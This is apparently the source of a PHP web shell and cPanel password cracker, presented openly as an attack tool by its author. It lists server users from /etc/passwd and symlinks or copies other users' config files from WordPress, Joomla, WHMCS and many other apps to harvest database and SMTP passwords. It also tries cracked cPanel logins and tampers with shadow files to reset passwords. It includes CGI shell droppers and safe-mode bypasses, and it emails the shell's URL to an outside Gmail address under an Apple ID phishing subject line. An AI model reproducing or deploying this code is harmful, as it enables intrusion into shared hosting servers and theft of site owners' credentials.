...
<html>
 <title>Ghazascanner Special Force</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<?php
 	/*
	1990 Cpanel Cracker Coded By M4L1KL8590X
	*/
...
function ambilKata($param, $kata1, $kata2){
	...
	if(isset($_POST['usernames']) && isset($_POST['passwords']))
	{
			...
			$vulns = fopen("cpanel.txt","a+");
fwrite($vulns,$user.'|'.$pass."\n");
			exit;
	}
	}
...
color="red" face="comic sans ms"size="2"><b>
<font color=#ff9933>
</font><br><font color=#00FF00>--==[[icq:@greatzcode]]==--</font><br><font color=white>-=| skype:zakir sabbas |=-<br>

</table>
</table> <div align=center><font color=#00FF00 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="0" width="70%"><span class="footerlink"> ####### Coded By M4L1KL8590X #######</span></marquee>
<br></font></div><div align=center><table width=50%>
 ...
 <form method="POST" target="_blank">
  <strong>
   ...
   <br>
   <a href="?" class="style2"><strong>M4L1KL8590X CPanelCracker Script</strong></a></center></td><br><br>

   <tr>
   <td>
   <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
   <td valign="top" bgcolor="#000" class="style2" style="width: 139px">
  <strong>User :</strong></td>
   <td valign="top" bgcolor="#000" colspan="5"><strong><textarea cols="80" rows="10" name="usernames"><?php $uSr=file("/etc/passwd"); 
                             foreach($uSr as $usrr) { $str=explode(":",$usrr);
                             echo $str[0]."\n";
                             } echo system('ls /var/mail');
                             echo system('ls /home'); ?></textarea></strong></td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#000" class="style2" style="width: 139px">
  <strong>Pass :</strong></td>
   <td valign="top" bgcolor="#000" colspan="5"><strong><textarea cols="80" rows="10" name="passwords"></textarea></strong></td>
   </tr>

   <tr>
   <td valign="top" bgcolor="#000" class="style2" style="width: 139px">
  <strong>Type :</strong></td>
   <td valign="top" bgcolor="#000" colspan="5">
  ...
  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
   ...
   <tr>
   <td valign="top" bgcolor="#000" style="width: 139px"></td>
   <td valign="top" bgcolor="#000" colspan="5"><strong><input type="submit" value="start">
  ...
  <tr>
   <td valign="top" bgcolor="#000" class="style1" colspan="6"><strong>Config Zone</strong></td>
       </tr>
    <tr>

   <td valign="top" bgcolor="#000" style="width: 139px"><strong>Get User & Config</strong></td>
   <td valign="top" bgcolor="#000" colspan="5">
  <strong>

<a href="?config=grabber">Get Config !</a>|||||<a href="?0=bypasswd">Bypass /etc/passwd !!</a>|||||<a href='?jancok=cgi'>CGI 1</a>|||||
<a href='?jancok=cgi2'>CGI 2</a>
<?php

if($_GET['config'] == 'grabber') {
            
    if($_POST){    if($_POST['config'] == 'vhosts') {
        @mkdir("ghz_vhosts", 0777);
exe("ln -s / ghz_vhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex ghz.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("ghz_vhosts/.htaccess",$htaccess);
...
exe("ln -s ".$user."/httpdocs/wp-config.php ghz_vhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php ghz_vhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php ghz_vhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php ghz_vhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php ghz_vhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php ghz_vhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml ghz_vhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php ghz_vhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php ghz_vhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("ghz_config", 0777);
@symlink("/","ghz_config/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex ghz.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("ghz_config/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("ghz_sym404", 0777);
@symlink("/","ghz_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex ghz.htm
AddType text/plain .php 
AddHandler text/plain .php
...
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*ghz_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("ghz_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
                        mkdir("ghz_grab", 0777);
                        $isi_htc = "Options all\nRequire None\nSatisfy Any";
                        $htc = fopen("ghz_grab/.htaccess","w");
                        fwrite($htc, $isi_htc);    
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_ghz) {
$grab_config = array(
"/home/$user_ghz/.accesshash" => "WHM-accesshash",
"/home/$user_ghz/.my.cnf" => "Cpanel",
"/home/$user_ghz/.accesshash" => "WHM-accesshash",
"/home/$user_ghz/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_ghz/public_html/forum/config.php" => "phpBB",
"/home/$user_ghz/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_ghz/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_ghz/public_html/app/etc/local.xml" => "Magento",
"/home/$user_ghz/public_html/admin/config.php" => "OpenCart",
"/home/$user_ghz/public_html/application/config/database.php" => "Ellislab",
"/home/$user_ghz/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_ghz/public_html/includes/config.php" => "Vbulletin",
"/home/$user_ghz/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_ghz/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_ghz/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_ghz/public_html/inc/config.php" => "MyBB",
"/home/$user_ghz/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_ghz/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_ghz/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_ghz/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_ghz/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_ghz/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_ghz/public_html/inc/conf_global.php" => "IPB",
"/home/$user_ghz/public_html/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_ghz/public_html/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/blog/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/submitticket.php" => "^WHMCS",
"/home/$user_ghz/public_html/cms/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/beta/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/portal/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/site/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/main/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/home/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/demo/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/test/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/v1/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/v2/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/new/configuration.php" => "Joomla",
"/home/$user_ghz/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_ghz/public_html/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_ghz/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_ghz/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_ghz/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_ghz/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_ghz/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_ghz/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_ghz/public_html/secure/includes/iso4217.php" => "Hostbills",
...
"/home/$user_ghz/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  
...
$file_config = fopen("ghz_grab/$user_ghz-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"ghz_config/".$user_ghz."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"ghz_sym404/".$user_ghz."-".$nama_config.".txt");
if($sym404){
    @mkdir("ghz_sym404/".$user_ghz."-".$nama_config.".txt404", 0777);
    $htaccess="Options Indexes FollowSymLinks
DirectoryIndex ghz.htm
HeaderName ghz.txt
Satisfy Any
...
@file_put_contents("ghz_sym404/".$user_ghz."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"ghz_sym404/".$user_ghz."-".$nama_config.".txt404/ghz.txt");
            ...
            echo "<center><a href='?path=$path/ghz_grab'><font color=lime>Done</font></a></center>";
        }
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"ghz_sym404/root/\">SymlinkNya</a>
<br><a href=\"ghz_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"ghz_config/root/\">Symlinknya</a>
<br><a href=\"ghz_config/\">Configurations</a></center>";
            }if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"ghz_symvhost/root/\">Root Server</a>
<br><a href=\"ghz_symvhost/\">Configurations</a></center>";
            }
        
        
        }else{
        echo "<form method=\"post\" action=\"\"><center>
        </center></select><br><textarea name=\"passwd\" class='area' cols='80' rows='10'>\n";
        ...
        <option value=\"vhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}

}
elseif($_GET['jancok'] == 'cgi2') {
    $cgi_dir = mkdir('rabbitz_cgi', 0755);
        chdir('rabbitz_cgi');
    $file_cgi = "cgi2.rabbitz";
        $memeg = ".htaccess";
    ...
    chmod($file_cgi, 0755);
        chmod($memeg, 0755);
    echo "<br><center>Done ... <a href='rabbitz_cgi/cgi2.rabbitz' target='_blank'>Klik Here</a>";
}
elseif($_GET['jancok'] == 'cgi') {
    $cgi_dir = mkdir('rabbitz_cgi', 0755);
        chdir('rabbitz_cgi');
    $file_cgi = "cgi.rabbitz";
        $memeg = ".htaccess";
    $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .rabbitz \n AddHandler cgi-script .rabbitz \n AddHandler cgi-script .rabbitz";
    $htcgi = fopen(".htaccess", "w");
    ...
    chmod($file_cgi, 0755);
        chmod($memeg, 0755);
    echo "<br><center>Done ... <a href='rabbitz_cgi/cgi.rabbitz' target='_blank'>Klik Here</a>";
}
elseif($_GET['0'] == 'bypasswd') {
...
?>
   ...
   <td valign="top" bgcolor="#000" class="style1" colspan="6"><strong>Tools</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#000" style="width: 139px"><strong>Upload</strong></td>
   <td valign="top" bgcolor="#000" colspan="5">
  <strong>
<?php
...
<tr>
                <td valign="top" bgcolor="#000" style="width: 139px"><strong>Kill Safe Mode</strong></td>
   <td valign="top" bgcolor="#000" colspan="5">
<strong>
...
<?php
 ...
 echo "<right>";
echo"<a href='?0=disablefunc'>Kill Safe Mode!!</a>
";
echo "<right/>";


if($_GET['0'] == 'disablefunc'){
        echo "<br><br><center>";
...
?>
 <tr>
   <td valign="top" bgcolor="#000" class="style1" colspan="6"><strong>More Fucker</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#000" style="width: 139px"><strong>Get Fucker!!!</strong></td>
   <td valign="top" bgcolor="#000" colspan="5">
	          <a href="?0=cpgrab">cPanel Grabber</a>|||||||||| <a href="?0=jumping">Jumping</a>|||||||||| <a href="?0=goblok">cPanel SMTP</a>|||||||||| <a href="?0=wp">Wordpress Setup</a>|||||||||| <a href="?0=smtpxd">SMTP Grabber</a><br>
...
<input type="text" name="chsmtpconfig" placeholder="Config URL Here">
<br><br>
<input type="submit" name="chsmtp" value="Submit">
</form>';
...
<br><br>
<input type="submit" name="chxe" value="Change Admin">
</form><br><br>
<?php
 if($_POST['chxe']){ $get2 = httpGet($_POST['confleg']);
 preg_match_all('#<a href="(.*?)"#', $get2, $config);
  $count = 1;
 foreach($config[1] as $don){ $get = httpGet($_POST['confleg']."/".$don);
...
if ($_GET['0'] == 'goblok'){
  ...
  fwrite($f, $wr);
  fclose($f);
  $parm = "url:" . $site.':2083/resetpass?start=1';
  echo '<br/><center>'.$parm.'<br/>user:'.$user.'</center>';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

$name = "admin"; $to = 'haky946@gmail.com'; $web="$_SERVER[HTTP_HOST]"; 
$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
$body = ' 
<a href="'.$x_path.'">click here</a>
<br> 
<a>gift to M4L1KL8590X</a> his buy buy!!!! '; 
$emails = "admin@".$_SERVER['SERVER_NAME'].""; 
$headers = 'From: ' .
$emails . "rn". 
$headers = "Content-type: text/htmlrn"; 'Reply-To: ' . 
$emails. "rn" . 'X-Mailer: PHP/' . phpversion(); 
if (mail($to,
$subject,
$body,
$headers,$name)) 
{ echo("<center>Support For Mailer</center>"); 
} else 
{ 
echo("<center>Not Support For Mailer</center>"); 
  }
 //Bksmile **(RooTTN)**
...
$ex=explode("\r\n",$passwd);
//backup shadow
@link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.pistontn.bak');
//delete shadow
...
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$domain.'.txt');
$p=file_get_contents(''.$path.'/'.$domain.'.txt');
...
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$dmn[$j-1].'.txt');
$p=file_get_contents(''.$dmn[$j-1].'.txt');
$password=entre2v2($p,'password="','"');
...
elseif($_GET['0'] == 'jumping') {
    ...
    while($passwd = fgets($etc)) {
        if($passwd == '' || !$etc) {
            ...
            foreach($user_jumping[1] as $user_ghz_jump) {
                $user_jumping_dir = "/home/$user_ghz_jump/public_html";
                    ...
                    if(function_exists('posix_getpwuid')) {
                        ...
                        if($domain_jump == '') {
                            ...
                            foreach($domains_jump[1] as $dj) {
                                ...
                                if($user_jumping_url == $user_ghz_jump) {
                                    echo " => ( <u>$dj</u> )<br>";
                                    break;
                                }
                            }
...
?>
  ...
  <tr>
   <td valign="top" bgcolor="#000" class="style1" colspan="6"><strong>GET PASSWORD</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#000" style="width: 139px"><strong>Get password!!!</strong></td>
   <td valign="top" bgcolor="#000" colspan="5">
  <strong>
...
<br><br>
<input type="submit" name="ch" value="Submit">
</form>
</center>
<?php set_time_limit(0);
 error_reporting(0);
 $g = $_POST['chsmtp'];
                                        $dir = $_POST['chsmtpconfig'];
                                        if (isset($g) && $dir != "") {
...
preg_match('#\'DB_PASSWORD\', \'(.*)\'#', $cnurl, $m1); // wordpress
                                                preg_match('#smtphost = \'(.*)\'#', $cnurl, $smtphost); // smtphost
                                                preg_match('#smtpuser = \'(.*)\'#', $cnurl, $smtpuser); // smtpuser
                                                preg_match('#smtppass = \'(.*)\'#', $cnurl, $smtppass); // smtppass
                                                preg_match('#smtpport = \'(.*)\'#', $cnurl, $smtpport); // smtpport
                                                if (!empty($smtppass[1])) {
                                                	echo $smtphost[1]."|".$smtpport[1]."|".$smtpuser[1]."|".$smtppass[1] . "<br>";
                                                }
                                            }
                                        }
...
<?php set_time_limit(0);
 ...
 ?>
        ...
        <tr>
   <td valign="top" bgcolor="#000" class="style1" colspan="6"><strong><form method="post"><input type="submit" name="goblok" value=" M4L1KL8590X Expect Us"></input></form></strong>

 <?php
if (isset($_POST['goblok'])){
